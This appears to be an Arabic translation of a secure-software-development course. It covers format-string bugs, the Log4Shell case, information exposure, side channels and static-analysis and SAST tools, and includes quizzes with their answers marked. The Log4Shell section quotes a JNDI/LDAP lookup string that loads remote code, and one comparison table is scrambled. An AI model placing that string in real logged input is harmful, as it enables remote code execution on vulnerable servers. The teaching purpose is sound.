تعد إجراءات إخراج لغة البرمجة C خطيرة بشكل خاص ، لأن تصميمها يفترض أن معلمات سلسلة التنسيق من مصادر موثوقة. على سبيل المثال  ، تأخذ عائلة **printf () من الإجراءات (بما في ذلك fprintf ** و **snprintf**) معلمة **سلسلة تنسيق** ؛ إذا تمكن المهاجم من التحكم في سلسلة التنسيق ، فيمكن للمهاجم أن يجعل النتيجة طويلة بشكل تعسفي (غالبا ما يؤدي إلى تجاوز سعة المخزن المؤقت) ، أو طباعة أي منطقة ذاكرة (الكشف عن معلومات أو بيانات سرية تمكن تجاوز الأمان) ، أو استخدام * ***٪n**  عملية للكتابة فوق مناطق الذاكرة التعسفية. وينطبق الشيء نفسه على **syslog**() (الذي  يكتب معلومات سجل النظام) و **setproctitle()** (الذي يعين السلسلة المستخدمة لعرض معلومات معرف العملية). العديد من الوظائف ذات الأسماء التي تبدأ ب "**err" أو "**warn**" ، أو تحتوي على** "log" **، أو تنتهي ب "**printf**" تستحق المراجعة.**

معظم أنظمة تنسيق لغات البرمجة الأخرى ليست خطيرة تماما ، لكنها لا تزال تسبب مشاكل. أفضل حل هو التأكد من أن المستخدم غير الموثوق به لا يمكنه توفير سلسلة التنسيق. إذا تطلبت الظروف السماح بذلك  ، *فتأكد* من  أن النظام الذي تستخدمه لا يسمح بوجود ثغرة أمنية ، على سبيل المثال ، من خلال السماح فقط بأنواع معينة من التنسيقات (تأكد من التحقق من صحة ذلك!) ، أو استخدم مكتبة مصممة خصيصا لاستخدامها بأمان مع قوالب غير موثوق بها. حتى في هذه الحالات ، تذكر أنه إذا كان بإمكان المستخدم التحكم في قالب الإخراج ، فيمكن للمستخدم إنتاج كمية وفيرة من المخرجات. تأكد من أن هذه ليست مشكلة خطيرة (على سبيل المثال ، من خلال التأكد من أن نفس المستخدم فقط يرى النتائج من هذا النموذج ، بحيث ينتهي الأمر بالمهاجمين بمهاجمة أنفسهم فقط).

العديد من أنظمة تنسيق الإخراج لديها طريقة لدعم التدويل (**i18n**) والتعريب (**l10n**). يتيح  لك نظام **gettext**() المستخدم على نطاق واسع  ، على سبيل المثال ، تحديد سلسلة (بما في ذلك سلسلة تنسيق أو قالب) باستخدام الإعدادات المحلية الحالية للمستخدم. عادة ما يتم توفير قيمة الإعدادات المحلية بواسطة مستخدم غير موثوق به. ومع ذلك ، لا بأس بذلك طالما أن تأثيره الوحيد هو الاختيار بين سلاسل التنسيق أو القوالب ، والتي تعرف أنه يمكنك الوثوق بها جميعا.

>  وقت القصة: Log4Shell / log4j

> log4j هو مكون برمجي مكتوب بلغة Java يقوم بتنفيذ التسجيل (تسجيل الأحداث للتدقيق والتصحيح لاحقا). يستخدم على نطاق واسع لتسجيل الأشجار ، بما في ذلك من قبل Apple iPhones و Teslas و Minecraft chat. Log4Shell (رسميا CVE-2021-44228) هي ثغرة أمنية خطيرة للغاية في سلسلة log4j 2.X. في الإصدارات المعرضة للخطر من log4j، "يمكن للمهاجم الذي يمكنه التحكم في رسائل السجل أو معلمات رسالة السجل تنفيذ تعليمات برمجية عشوائية تم تحميلها من خوادم LDAP عند تمكين استبدال البحث عن الرسائل". (NVD ،  [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) من السهل تشغيله ؛ يمكن للمهاجم تضمين نص مسجل بنماذج مثل `${jndi:ldap://45.83.193.150:1389/Exploit}`. كان هناك ما يقرب من 8000 اختبار في مشروع log4j ، لكن لم يعثر أي منها على هذا ؛ أظهرت الاختبارات أن الوظائف المتوقعة تعمل ، لكنها لم تضمن أن هذه الوظيفة غير المرغوب فيها لن تعمل. هذا مثال على السماح للمستخدمين غير الموثوق بهم بالتحكم في تنسيق الإخراج ، وفي هذه الحالة تمكين تنفيذ التعليمات البرمجية العشوائية. كن حذرا من إعطاء المستخدمين غير الموثوق بهم هذا المستوى الخطير من التحكم!


#### اختبار 4.10: تنسيق السلاسل والقوالب

\>\>حدد كل العبارات الحقيقية.<<

[!x] حيثما كان ذلك عمليا ، لا تسمح للمستخدمين غير الموثوق بهم بالتحكم في التنسيق / القالب المستخدم عند تنسيق الإخراج.

[x] يفترض تصميم C أن معلمات سلسلة التنسيق من مصادر موثوقة.

[ ] يعد وجود آلية لتبسيط تنسيق الإخراج أمرا غير معتاد في لغات البرمجة.

### تقليل التعليقات / التعرض للمعلومات

تجنب إعطاء معلومات الأمان أو المعلومات الحساسة للمستخدمين غير الموثوق بهم. إذا كان الطلب مميزا ، فما عليك سوى النجاح أو الفشل ، وإذا فشل فقط قل أنه فشل وقلل من المعلومات حول سبب فشله. باختصار ، قلل التعليقات إلى المستخدمين غير الموثوق بهم إذا كان ذلك قد يعرض الأمان للخطر ، وبدلا من ذلك أرسل المعلومات التفصيلية إلى سجلات تتبع التدقيق. على سبيل المثال:

* إذا كان برنامجك يتطلب نوعا من مصادقة المستخدم (على سبيل المثال ، أنت تكتب خدمة شبكة أو برنامج تسجيل دخول) ، فامنح المستخدم أقل قدر ممكن من المعلومات قبل المصادقة. على وجه الخصوص ، تجنب التخلي عن رقم إصدار البرنامج قبل المصادقة. بخلاف ذلك ، إذا تم العثور على ثغرة أمنية في إصدار معين من برنامجك ، فإن المستخدمين الذين لا يقومون بالترقية من هذا الإصدار يعلنون للمهاجمين أنهم معرضون للخطر.

* إذا كان برنامجك يقبل كلمة مرور، فلا تعرض كلمة المرور الكاملة أثناء إدخالها بشكل افتراضي. على الأكثر ، اعرض أحدث شخصية تم إدخالها. قد يؤدي إظهار كلمة المرور الكاملة أثناء إدخالها إلى تمكين الآخرين من رؤية كلمة المرور. في نماذج HTML ، قم بتعيين نوع الإدخال إلى كلمة مرور ، مما يحد من الملاحظات عن قصد. تسمح العديد من واجهات المستخدم للمستخدمين بتحديد عرض المعلومات الحساسة عن طريق الضغط على رمز العين ؛ هذا جيد ، لأن العرض يكون حسب طلب مستخدم محدد بدلا من افتراضيا.

* عند فشل تسجيل الدخول ، ما عليك سوى قول "فشل* اسم المستخدم أو كلمة المرور" أو ما شابه - لا تكشف ما إذا كان اسم المستخدم أو كلمة المرور* هي التي فشلت. يمكن أن يخبر ذلك المهاجم أن اسم المستخدم صالح ، ويجعل المزيد من الهجمات أسهل.

* إذا حاول مستخدم إنشاء حساب باستخدام عنوان بريد إلكتروني، فلا تخبر المستخدم إذا كان الحساب الذي يحتوي على عنوان البريد الإلكتروني هذا موجودا بالفعل. وبالمثل ، إذا حاول المستخدم إجراء إعادة تعيين كلمة المرور باستخدام عنوان بريد إلكتروني ، فلا تخبر المستخدم إذا لم يكن هناك حساب بعنوان البريد الإلكتروني هذا. سيسمح توفير هذه المعلومات للمهاجم بتحديد ما إذا كان يتم استخدام عنوان بريد إلكتروني معين (أم لا) بواسطة بعض الحسابات الموجودة.

* بشكل عام ، لا تعرض البيانات الحساسة / الخاصة بشكل افتراضي ما لم يكن ذلك ضروريا في هذه المرحلة.

تنفيذ تسجيل التدقيق في وقت مبكر من التطوير. بعد ذلك ، إذا كنت بحاجة إلى تسجيل معلومات أكثر تفصيلا للمساعدة في تصحيح الأخطاء ، فقم بالإبلاغ عن هذه المعلومات في السجلات بدلا من عرضها للمستخدم. تعد سجلات التدقيق ملائمة حقا لتصحيح الأخطاء (لأنها مصممة لتسجيل معلومات مفيدة دون التدخل في العمليات العادية) ، ومن المرجح أن تقوم بتضمين معلومات حالة مفيدة في السجلات إذا تم تطويرها بالتوازي مع بقية البرنامج. كما أنها ستقلل من إغراء الكشف عن الكثير للمستخدمين غير الموثوق بهم.

تأكد أيضا من عدم تمكن المستخدمين من تلقي معلومات غير مصرح بها. يجب تعيين الأذونات ومساحات الأسماء بوضوح لمنع ذلك.

 يعد التعرض غير الصحيح للمعلومات سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 20 و 2019 CWE Top 25 # 4. تم تحديده على أنه [CWE-200 ](https://cwe.mitre.org/data/definitions/200.html)، *تعرض المعلومات الحساسة لممثل غير مصرح به* (المعروف أيضا باسم *التعرض للمعلومات*).

#### اختبار 4.11: تقليل التعليقات / التعرض للمعلومات

\>\>إذا اتصل مستخدم غير موثوق به بنظامك عبر شبكة، وفشل الطلب، فيجب تزويده بتتبع مكدس مفصل. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

نأمل أن يكون هذا سهلا حقا. المشكلة ليست فقط أن هذه تجربة مستخدم رهيبة. يمكن أن يؤدي أيضا إلى خرق أمني. يجب عادة إخبار المستخدمين غير الموثوق بهم إذا فشل بعض الطلبات ، ولكن لا يوجد سبب يجعلهم يرون كل هذه التفاصيل ؛ هذا هو الغرض من السجلات.

[تفسير]

### هجمات القنوات الجانبية

في بعض الحالات، قد يرسل البرنامج الذي تقوم بتطويره مخرجات ذات صلة بالأمان لم تكن تنوي إرسالها.

 * هجوم القناة الجانبية* هو هجوم يحصل فيه المهاجم على معلومات غير مصرح بها من خلال استغلال كيفية تنفيذ البرنامج (بدلا من ضعف في خوارزمية أو عيب). هناك العديد من أنواع مختلفة من هجمات القنوات الجانبية. فيما يلي بعض الأمثلة:

* هجوم التوقيت — هجوم يعتمد على قياس الوقت الذي تستغرقه الحسابات المختلفة. من الممكن حتى تنفيذ بعض هجمات التوقيت عبر الشبكة ، لأن الإحصاءات الحديثة يمكن أن تواجه قدرا كبيرا من الارتعاش.

* هجوم ذاكرة التخزين المؤقت - هجوم يعتمد على مراقبة الوصول إلى ذاكرة التخزين المؤقت ، عادة على بيئة مادية مشتركة (مثل الخدمة السحابية).

* هجوم مراقبة الطاقة - هجوم يعتمد على مراقبة استهلاك الطاقة الكهربائية المتفاوت.

* remanence البيانات - هجوم يعتمد على قراءة البيانات بعد أن كان يعتقد أنه تم حذفها.

غالبا ما تكون أنظمة التشفير أهدافا لهذه الهجمات ، لذلك يجب تنفيذ المكتبات التي تنفذ التشفير خصيصا لمحاولة مواجهة مثل هذه الهجمات. سنناقش هذا بمزيد من التفصيل عندما نناقش التشفير.

إذا كنت بحاجة إلى مواجهة هذه الأنواع من الهجمات ، بخلاف ما هو مطلوب للتشفير ، فقد يكون من الصعب إحباط هجمات القنوات الجانبية. إذا كان من المهم للغاية مواجهة هجمات القنوات الجانبية ، فمن الأفضل في كثير من الأحيان الدفع للقضاء على مشاركة الموارد والوصول إليها التي تمكن القنوات الجانبية. على سبيل المثال ، إذا كانت هجمات ذاكرة التخزين المؤقت مصدر قلق كبير ، فيمكنك اختيار استخدام أجهزة أحادية الغرض أو الدفع لمزود سحابة لتقليل المشاركة (على سبيل المثال ، لاستخدام بنية مستأجر واحد). يمكن مواجهة هجمات مراقبة الطاقة عن طريق جعل من الصعب على المهاجم قياس الاستخدام الكهربائي.

لحسن الحظ ، بخلاف الهجمات على أنظمة التشفير ، أصبحت هجمات القنوات الجانبية أقل شيوعا اليوم. يحتاج معظم المطورين إلى التركيز على المشكلات الأخرى التي تمت مناقشتها في هذه الدورة التدريبية ، وعندها فقط (في ظروف أكثر تخصصا) يحتاجون إلى القلق بشأن هجمات القنوات الجانبية. لن يكلف المهاجمون عادة عناء محاولة تنفيذ هجوم قناة جانبية إذا كان البرنامج مليئا بثغرات أمنية يسهل العثور عليها مثل XSS وتجاوز سعة المخزن المؤقت.

# الجزء الثاني: الامتحان النهائي

* غير مدرج كجزء من الإصدار المجاني من الدورة التدريبية.

# الجزء الثالث: التحقق والمزيد من الموضوعات المتخصصة

# التحقق

يصف هذا الفصل كيفية التحقق من الأمان، بما في ذلك قيود الأدوات ومعنى *التحليل الثابت *والتحليل الديناميكي* والأنواع الشائعة من الأدوات مثل الماسحات الضوئية لرمز الأمان/أدوات اختبار أمان التطبيقات الثابتة (SAST) والمشوشات والماسحات الضوئية لتطبيقات الويب.* 

أهداف التعلم:

1. فهم أدوات التحقق، بما في ذلك قضايا الإيجابيات الخاطئة والسلبيات الخاطئة.

2. ناقش الأنواع الشائعة من أدوات التحليل الثابتة، بما في ذلك الماسحات الضوئية لرموز الأمان/أدوات اختبار أمان التطبيقات الثابتة (SAST).

3. ناقش الأنواع الشائعة من أدوات التحليل الديناميكي، بما في ذلك أجهزة التشويش والماسحات الضوئية لتطبيقات الويب.

## أساسيات التحقق

### نظرة عامة على التحقق

يمكن تعريف التحقق على أنه تحديد ما إذا كان شيء ما يتوافق مع متطلباته أم لا (بما في ذلك اللوائح والمواصفات وما إلى ذلك). الاختبار هو أحد أساليب التحقق ، لكن التحقق أكثر من مجرد اختبار. نريد التحقق (إلى مستوى معقول) من أن برنامجنا آمن ، تماما كما نريد التحقق من أن برنامجنا يقوم بأشياء أخرى من المفترض أن يفعلها.

#### نهج التحقق

هناك فئتان تقنيتان رئيسيتان للتحقق:

* **التحليل الثابت** هو أي نهج للتحقق من البرامج (بما في ذلك العثور على العيوب) دون تنفيذ البرنامج. يتضمن ذلك الأدوات التي تفحص شفرة المصدر بحثا عن نقاط الضعف (على سبيل المثال ، أدوات فحص الثغرات الأمنية في شفرة المصدر). ويشمل أيضا البشر قراءة التعليمات البرمجية ، والبحث عن المشاكل.

* **التحليل الديناميكي** هو أي نهج للتحقق من البرامج (بما في ذلك العثور على العيوب) عن طريق تنفيذ البرنامج على مدخلات محددة والتحقق من النتائج. الاختبار التقليدي هو نوع من التحليل الديناميكي. يعد اختبار Fuzz ، حيث ترسل العديد من  المدخلات *العشوائية* إلى برنامج لمعرفة ما إذا كان يفعل شيئا لا ينبغي له ، مثالا على التحليل الديناميكي.

لدى بعض الأشخاص أيضا فئة تسمى  التحليل *المختلط* للنهج التي تجمع بين الاثنين ، بينما سيتضمن البعض الآخر مناهج مختلطة في فئة التحليل الديناميكي.

#### تقارير صحيحة وكاذبة

هناك تاريخ طويل من استخدام أنواع مختلفة من أجهزة الكشف للكشف عن المواقف المهمة ، وكثير منها لا علاقة له بالبرامج. كاشفات الدخان ، على سبيل المثال ، تحاول اكتشاف الدخان الناتج عن الحرائق الخطرة. للأسف ، أجهزة الكشف ليست مثالية أبدا.

في مجال الأمن ، غالبا ما نرغب في استخدام الأدوات التي تعثر على أنواع معينة من نقاط الضعف وتبلغ عنها. من الناحية المثالية ، ستبلغ أداة اكتشاف الثغرات الأمنية هذه دائما عن نقاط الضعف التي تريد الإبلاغ عنها بالضبط ، ولا شيء آخر. مرة أخرى ، نادرا ما تحدث مثل هذه المثل في الواقع. لذلك قد تقوم الأداة بالإبلاغ عن شيء ما أم لا ، وقد يكون هذا التقرير أو عدم الإبلاغ صحيحا أو غير صحيح ، مما يؤدي إلى 4 احتمالات:

<table>
  <tr>
    تقرير <td><b>
     </b></td>التحليل / الأداة<td><b> التقرير صحيح</b></td>
    <td><b> الإبلاغ عن خطأ</b></td>
  </tr>
  <tr>
    <td><b> تم الإبلاغ عن (عيب)إيجابي صحيح (TP): تم الإبلاغ عنه بشكل</b> صحيح (عيب)إيجابي كاذب (FP): تقرير غير صحيح (عن</td> "عيب" ليس عيبا) ("خطأ من النوع الأول"<td><i>)لم يبلغ (عيب (هناك))سلبي حقيقي (TN): لم يبلغ بشكل صحيح (عيب معين</i>)سلبي </td>كاذب (FN<td><i></i></td></tr>)<tr> <td><b>
    </b>
    </td>
  <td><i>
  </i>
    </td>
    <td><i>
    </i> غير صحيح لأنه فشل في الإبلاغ عن (عيب) ("خطأ من النوع الثاني"):</td>
  </tr>
</table>


الحقيقة هي أنه عادة ما تكون هناك مفاضلة بين الإيجابيات الكاذبة والسلبيات الكاذبة. يمكن تصميم الأدوات أو تكوينها للحصول على عدد أقل من الإيجابيات الخاطئة (التقارير غير الصحيحة) ، ولكن هذا الافتقار إلى الحساسية يعني عادة أنه غالبا ما يكون لها المزيد من السلبيات الخاطئة (ستفشل في الإبلاغ عن الأشياء التي قد تتوقع الإبلاغ عنها). لمزيد من التفاصيل ، راجع [*تقرير SATE V: عشر سنوات من معارض أدوات التحليل الثابتة *](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf)، 2018.

#### أدوات التطبيق

إذا كنت تضيف أداة إلى مشروع موجود ، فقد ترغب في تكوين الأدوات للحد بشكل كبير مما تبلغ عنه ، والتركيز فقط على الثغرات الأمنية التي تثير قلقك أكثر. يمنحك هذا الوقت لتعلم كيفية *ضبط* الأداة وفهم نتائجها. بعد ذلك ، بمجرد معالجة هذه النتائج ، قم بزيادة حساسية أدواتك أو أضف المزيد من الأدوات لاكتشاف المزيد من المشكلات. لا فائدة من محاولة اكتشاف مشكلات أكثر مما يمكنك التعامل معه.

إذا كنت تضيف أدوات إلى مشروع بدأ حديثا ، فغالبا ما يكون من الأفضل لك تكوين أدواتك لتكون حساسة للغاية. في مشروع جديد ، لن تطغى عليك التقارير ، وستحصل على الفور على تعليقات حول المشكلات التي يمكن لأدواتك اكتشافها.

أين تضيف هذه الأدوات؟ باختصار ، أضف هذه الأدوات إلى أقصى حد إلى خط أنابيب التكامل المستمر (CI) على الأقل. بهذه الطريقة ، سيتم تحليل التغييرات الإضافية بشكل متكرر وسيتم الإبلاغ عن مشكلات الأمان مبكرا.

بعض الأدوات هي برمجيات المصدر المفتوح ، في حين أن البعض الآخر مملوك. وبعض الأدوات المسجلة الملكية باهظة الثمن، ولكن إذا كنت تستخدمها لتطوير برمجيات المصدر المفتوح، فإن العديد من الأدوات و/أو الخدمات مجانية الاستخدام أو متاحة بخصم كبير.

لذلك دعونا نلقي نظرة على بعض أنواع الأدوات التي يمكنك استخدامها للمساعدة في جعل برنامجك آمنا.

#### الاختبار 1.1: نظرة عامة على التحقق

\>\>عند استخدام الأدوات للبحث عن الثغرات الأمنية ، عادة ما يكون هناك خطر حدوث "سلبيات خاطئة" - أي عدم الإبلاغ عن الثغرات الأمنية حتى عندما تكون موجودة والأداة مصممة للعثور على هذا النوع من الثغرات الأمنية. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

## التحليل الثابت

### نظرة عامة على التحليل الثابت

التحليل الثابت هو أي نهج للتحقق من البرامج (بما في ذلك العثور على العيوب) دون تنفيذ البرنامج. وهذا يشمل البشر الذين يراجعون التعليمات البرمجية. يتضمن أيضا الأدوات التي تراجع التعليمات البرمجية المصدر و / أو التعليمات البرمجية للبايت و / أو التعليمات البرمجية للآلة.

#### المراجعة البشرية

يمكن أن يكون البشر مذهلين في العثور على العيوب. هذه واحدة من المزايا المحتملة الكبيرة للبرمجيات مفتوحة المصدر (OSS) ؛ نظرا لأنه يمكن لأي شخص مراجعة شفرة مصدر OSS للعثور على العيوب ، فهناك مراجعة جماعية محتملة للأقران. لكن البشر لديهم سلبياتهم. وقت الإنسان مكلف ، ويشعر البشر بالملل ، والبشر لديهم أيام "عطلة" يكونون فيها أقل فعالية (على سبيل المثال ، قد يفوتهم أشياء). البشر المختلفون لديهم مستويات مختلفة من الفعالية أيضا. من الرائع أن يقوم البشر بمراجعة التعليمات البرمجية ، ولكنك تريد أيضا دعم البشر بالأدوات التي ستكتشف المشكلات التي قد يفوتها البشر.

إذا كان بإمكانك جعل البشر يراجعون التعليمات البرمجية ، فافعل ذلك! ولكن قد ترغب في توجيه البشر لفحص القضايا التي لا تجيدها الأدوات بشكل خاص. على وجه الخصوص ، من الجيد أن يقوم الأشخاص بمراجعة "نقاط الدخول" (سطح الهجوم) عبر حدود الثقة للتأكد من أن كل طلب إما مصرح به أو مرفوض. إن تحديد ما إذا كان الطلب مصرحا به أم لا ليس شيئا تجيده معظم الأدوات (فهي تفتقر إلى المعلومات اللازمة لاتخاذ القرار). علاوة على ذلك ، إذا كان هذا التحليل صعبا للغاية بالنسبة للبشر ، فهناك خطأ ما في البرنامج - يجب أن يكون *من السهل* نسبيا  الإجابة على هذا السؤال في كل نقطة دخول.

بشكل عام ، إذا كانت هناك مشاكل لا تجيد الأدوات العثور عليها ، فقد يكون من الأفضل تعديل التصميم الخاص بك بحيث لا يمكن أن تحدث المشكلة في المقام الأول. على سبيل المثال ، اختر لغة آمنة للذاكرة أو صمم مكون نظام بحيث يمكن تقديم الطلبات الآمنة فقط. إذا لم يفلح ذلك ، فقد يكون من الحكمة محاولة العثور على أداة للعثور عليها أو تطويرها. ومع ذلك ، ستكون هناك دائما مشكلات لن تعمل الأدوات بشكل جيد من أجلها. إذا لم ينجح أي شيء آخر ، فاعمل على تركيز أقوى أداة على الإطلاق: الناس. لكن وقت الناس محدود ، لذا حيثما أمكن ، حاول ألا تعتمد *فقط* على المراجعة البشرية.

 تعد عملية المراجعة البشرية لتغييرات التعليمات البرمجية والتكوين ، لتقليل فرصة إدخال التعليمات البرمجية أو التكوين الضار في خط أنابيب البرنامج الخاص بك ، جزءا من 2021 OWASP Top 10 # 8 (A08: 2021) ، *فشل سلامة البرامج والبيانات*. يمكن أن تساعد عمليات المراجعة البشرية في مواجهة *التحكم في الوصول المكسور* ، 2017 OWASP Top 10 # 5 و 2021 OWASP Top 10 # 1.

مع ذلك ، لنبدأ في مناقشة الأدوات لمساعدتنا.

#### أدوات عامة للعثور على الأخطاء: أدوات الجودة وتحذيرات المترجم وأدوات التحقق من النوع

تقوم بعض الأدوات بفحص التعليمات البرمجية المصدر أو شفرة البايت أو التعليمات البرمجية للآلة للبحث عن مشاكل "الجودة" العامة. على سبيل المثال ، قد يبحثون عن مسافة بادئة مضللة ، أو مجموعات من التركيبات التي تشير عادة إلى وجود عيب ، أو طرق طويلة للغاية قد يكون من الصعب فهمها لاحقا. هناك مجموعة كبيرة ومتنوعة من هذه ، بما في ذلك علامات تحذير المترجم ، ومدققات النمط ، وما إلى ذلك. غالبا ما تكون الأدوات نفسها رخيصة أو مجانية ، وغالبا ما تعمل بسرعة ، لأنها لا تحتاج عادة إلى إجراء تحليل عميق.

غالبا لا تركز هذه الأدوات على الأمان، ولكن لا يزال استخدامها يساعد في تحسين الأمان:

1. بعض العيوب التي يجدونها هي ثغرات أمنية.

2. هناك تقارير تفيد بأن ** الكود النظيف أسهل على الأدوات الأخرى والبشر لفهمه ... لذا فإن إصلاح المشكلات المبلغ عنها يمكن أن يجعل الأساليب الأخرى أكثر فعالية.

إذا كنت تبدأ مشروعا جديدا ، فمن المهم تشغيل أكبر عدد ممكن من هذه الأدوات (بما في ذلك تحذيرات برنامج التحويل البرمجي) في أقرب وقت ممكن. إذا قمت بتشغيلها مبكرا ، فسترى بعض التقارير التي توصي بنهج مختلف واستخدمه بدلا من ذلك. إذا حاولت إضافتها إلى  مشروع *موجود* ،  فغالبا ما ترى الكثير من المشكلات التي يجب إصلاحها ، على الرغم من أن احتمالات أن تكون أي مشكلة خطيرة صغيرة. لذلك إذا كان لديك مشروع حالي، فستحتاج عادة إلى إضافة هذه الأدوات ببطء، وتكوينها للإبلاغ عن مجموعة فرعية فقط (مثل التقارير التي تم تشغيلها بواسطة تغيير فقط) ثم توسيع ما تبلغ عنه ببطء.

تنطبق تعليقات مماثلة على فحص النوع الثابت. تحتوي بعض لغات البرمجة على عمليات تحقق مضمنة للأنواع المعلنة بشكل ثابت. هناك إيجابيات وسلبيات للأنواع المعلنة بشكل ثابت. يستغرق الأمر وقتا لتحديد الأنواع وتحديدها ، لذا فإن القيام بذلك يمكن أن يبطئ التطوير الأولي ، وهو أمر سلبي للبرامج الصغيرة والتخلص منها. ومع ذلك ، يمكن أن تساعد هذه الإعلانات الثابتة في العثور تلقائيا على أنواع معينة من العيوب ، بالإضافة إلى أدوات دعم المساعدة والتحسين. إذا كنت تستخدم لغة برمجة مع فحص ثابت للنوع ، فاعمل مع نظام الكتابة لاستخدامه للمساعدة في العثور على العيوب مبكرا.

ومع ذلك ، في حين أن هذه الأدوات غالبا ما تكون سهلة الاستخدام ، إلا أنها لا تركز بشكل عام على قضايا الأمان ... وبالتالي غالبا ما يفوتون القضايا الأمنية. دعنا نتحدث عن الأدوات التي تستخدم التحليل الثابت خصيصا للعثور على الثغرات الأمنية.

#### الماسحات الضوئية لرموز الأمان/أدوات اختبار أمان التطبيقات الثابتة (SAST)

تقوم بعض الأدوات بتحليل التعليمات البرمجية التي تبحث على وجه التحديد عن نقاط الضعف. يذهبون بمجموعة متنوعة من الأسماء ، مثل أدوات اختبار أمان التطبيقات الثابتة (SAST) ، أو ماسحات رمز الأمان ، أو ماسحات كود مصدر الأمان (إذا قاموا بفحص شفرة المصدر) ، أو ماسحات التعليمات البرمجية الثنائية (إذا قاموا فقط بفحص الملفات التنفيذية) ، أو *محللات التعليمات البرمجية الثابتة فقط*. يستخدم بعض الأشخاص مصطلح SAST فقط عندما تقوم الأداة بتحليل التعليمات البرمجية المصدر (لمزيد من التفاصيل ، راجع [*حساء الأبجدية AppSec: دليل ل SAST و IAST و DAST و RASP*](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/) بواسطة Fred Bals ، 2018 ، و 10 أنواع من أدوات اختبار أمان التطبيق: متى وكيف يتم استخدامها[* بواسطة Thomas Scanlon ، 2018) ، لكننا لن نحد من المصطلح بهذه الطريقة.*](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html) 

الفكرة وراء هذه الأدوات هي أن العديد من نقاط الضعف لها أنماط محددة. يمكن للأداة المصممة للبحث عن هذه الأنماط الإبلاغ عن أنواع مماثلة من نقاط الضعف.

الأنماط إرشادية بشكل عام ، وتبحث الأدوات المختلفة عموما عن أنماط مختلفة. لذلك يمكن لأداة واحدة العثور على *بعض* نقاط  الضعف ، ولكن لا ترتكب خطأ الاعتقاد بأن أيا من هذه الأدوات يجد *جميع* نقاط الضعف. بالإضافة إلى ذلك ، ستبحث كل أداة فقط عن الأنماط ذات الصلة بمجموعة معينة من اللغات / البيئات. هذا يعني أن هذه الأدوات جيدة فقط للغات / البيئات المصممة لدعمها ، بالإضافة إلى ذلك ، قد تكون الأداة أفضل في لغة واحدة من لغة أخرى. حتى مع وجود أدوات متعددة مصممة لدعم لغة معينة ، غالبا ما تجد الأدوات المختلفة نقاط ضعف يفوتها الآخرون.

إذا كان هدفك الأساسي هو العثور على أكبر عدد ممكن من الثغرات الأمنية ، فمن الأفضل استخدام أدوات متعددة ، حتى أدوات متعددة من نفس النوع ، بحيث يمكن اكتشاف ثغرة أمنية لم تكتشفها أداة واحدة بواسطة أداة أخرى. لسوء الحظ ، يمكن أن يصبح استخدام أدوات متعددة مكلفا في المال والجهد. بعض الأدوات باهظة الثمن ، وبغض النظر عن أي شيء ، يستغرق الأمر وقتا لتكوين الأداة لاستخدامها الخاص وتحليل تقاريرها. كما يحدث في كثير من الأحيان ، هناك مقايضة. ستتأثر مجموعة الأدوات التي تحددها بشدة بالموارد المتاحة ، بالإضافة إلى الاحتمالية والتأثير المتوقعين للثغرات الأمنية غير الموجودة.

بالطبع ، ليس كل ما يتم الإبلاغ عنه بواسطة أي من هذه الأدوات يمثل ثغرة *فعلية* . كل هذه الأدوات لديها بعض المخاطر لتوليد نتيجة إيجابية خاطئة. على سبيل المثال ، قد تكتشف الأداة ثغرة أمنية ناتجة عن بعض المدخلات ، ولكن قد تعلم أن المستخدم الموثوق به فقط يمكنه التحكم في هذا الإدخال ... لذلك في حين أن الأداة صحيحة بمعنى ما ، إلا أنها ليست في الواقع ثغرة أمنية. في كثير من الحالات ، من الأفضل إصلاح التقرير على أي حال ؛ غالبا ما يكون الناس مخطئين عندما يقولون شيئا "لا يمكن" حدوثه ، وقد يتغير البرنامج أو بيئته في المستقبل (لذا فإن إصلاحه سيؤدي إلى إثبات البرنامج في المستقبل). إذا كنت واثقا من أن التقرير إيجابي كاذب ، وأن "إصلاح" الشفرة لإزالة التقرير لا يستحق العناء ، فإن معظم هذه الأدوات لديها طريقة لتعطيل التقرير (على سبيل المثال ، عبر تعليق في شفرة المصدر). بهذه الطريقة ، ستتوقف الأداة عن الإبلاغ عنها ؛ وإلا فإن تقارير الأداة ستحتوي بمرور الوقت على مجموعة كبيرة فقط من الإيجابيات الخاطئة. فقط تأكد من تعطيل تقرير فقط إذا كنت *متأكدا من* أنه نتيجة إيجابية خاطئة.

#### الماسحات الضوئية المتخصصة لرموز الأمان / أدوات SAST

تم تصميم بعض الأدوات للبحث فقط عن نوع واحد أو عدد قليل جدا من أنواع الثغرات الأمنية. لا تزال هذه ماسحات ضوئية لرمز الأمان ، وتعرف أيضا باسم أدوات SAST ، ولكن نظرا لأنها مكتوبة خصيصا لإجراء هذا التحليل المحدد ، فقد تكون في بعض الأحيان أفضل في هذا التحليل من أداة ذات أغراض عامة مصممة للعثور على العديد من أنواع الثغرات الأمنية المختلفة. بالإضافة إلى ذلك ، لا تبحث بعض الأدوات ذات الأغراض العامة عن هذه المشكلات المحددة على الإطلاق.

فيما يلي بعض أنواع الثغرات الأمنية التي يمكن لأدوات SAST المتخصصة اكتشافها:

* الثغرات الأمنية في رفض الخدمة (ReDoS) للتعبير العادي (أي التعبيرات العادية ذات الأداء الأسوأ الرهيب). يمكنك البحث عن مصطلحات مثل "ReDoS" و "regex الشرير" و "regex الآمن". هذه استخراج التعبيرات العادية من التعليمات البرمجية المصدر ، ومن ثم تحليل التعبيرات العادية.

* بيانات الاعتماد المشفرة مثل مفاتيح التشفير وكلمات المرور. تسمى الأدوات التي تبحث عن بيانات الاعتماد المشفرة أحيانا "الماسحات الضوئية السرية".

تعد بيانات   الاعتماد المشفرة [ مشكلة شائعة لدرجة أنها 2021 CWE Top 25 # 16 ، CWE-798 ، ](https://cwe.mitre.org/data/definitions/798.html)*استخدام بيانات الاعتماد المشفرة*. هذا هو أحد الأسباب التي جعلت الماسحات الضوئية السرية شائعة بسرعة.

#### أدوات التحليل الثابتة الأخرى

هناك العديد من الأنواع الأخرى من أدوات التحليل الثابتة.

